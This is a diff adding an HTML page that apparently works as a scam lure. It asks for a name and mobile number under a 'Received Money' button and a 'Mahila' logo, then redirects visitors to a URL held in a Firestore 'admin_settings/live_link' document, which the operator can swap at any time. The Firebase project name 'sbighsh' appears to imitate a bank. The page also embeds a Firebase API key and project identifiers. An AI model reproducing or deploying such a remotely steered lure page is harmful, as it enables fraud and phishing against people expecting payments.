@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Profile Redirect</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-image: url('https://i.ibb.co/JjLfsM8M/Mahilalogi-png.jpg');
+      background-size: 100%;
+      background-position: center;
+      font-family: Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      margin-bottom: 110px;
+    }
+
+    .header-wrapper {
+      width: 100%;
+      background-color: #fff;
+      padding: 10px 0;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      z-index: 2;
+    }
+
+    .header-image {
+      width: 100%;
+      max-height: 100px;
+      object-fit: contain;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.85);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 20px;
+      z-index: 1;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background-color: #fff;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header Section with White Background -->
+  <div class="header-wrapper">
+    <img src="https://i.ibb.co/pr1DtzW1/mahilalogo-png.png" alt="Header" class="header-image">
+  </div>
+
+  <div class="container">
+    <input type="text" id="name" placeholder="Name" required>
+    <input type="tel" id="mobile" placeholder="Mobile Number" maxlength="10" pattern="\d{10}" required>
+    <button onclick="redirectToURL()">Received Money</button>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
+
+  <script>
+    // Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.firebasestorage.app",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let liveURL = "";
+
+    // Real-time Firestore listener for redirect URL
+    db.collection("admin_settings").doc("live_link").onSnapshot((doc) => {
+      if (doc.exists) {
+        liveURL = doc.data().url;
+      }
+    });
+
+    function redirectToURL() {
+      const mobile = document.getElementById("mobile").value;
+      if (!/^\d{10}$/.test(mobile)) {
+        alert("Please enter a valid 10-digit mobile number.");
+        return;
+      }
+      if (!liveURL) {
+        alert("Redirect URL not set by admin yet.");
+        return;
+      }
+      window.location.href = liveURL;
+    }
+  </script>
+
+</body>
+</html>
